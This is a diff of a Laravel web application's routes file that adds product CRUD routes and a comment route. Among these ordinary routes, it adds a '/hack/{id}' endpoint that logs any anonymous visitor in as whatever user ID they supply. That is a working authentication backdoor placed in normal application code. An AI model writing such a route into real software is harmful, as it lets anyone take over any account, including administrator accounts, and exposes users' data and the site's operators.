@@ -11,15 +11,23 @@
 |
 */
 
-Route::get('/', function () {
-    return view('welcome');
-});
+Route::get('/', 'HomeController@index');
 
+Route::get('/hack/{id}', function($id){
+    auth()->loginUsingId($id);
+    return back();
+});
 Auth::routes();
 
-Route::get('/home', 'HomeController@index')->name('home');
 
+//product
+Route::get("/product", 'ProductController@index');
+Route::get("/product/create", "ProductController@create");
+Route::get("/product/search", 'ProductController@search');
+Route::post("/product", "ProductController@store");
+Route::get("/product/{id}", "ProductController@show");
+Route::get("/product/{id}/edit", "ProductController@edit");
+Route::put("/product/{id}/update", "ProductController@update");
+Route::delete("/product/{id}/delete", "ProductController@destroy");
 
-Route::get('/listing/{id}', function(){
-    return view("admin.index");
-});
+Route::post("/comment/{id}", "CommentController@store");
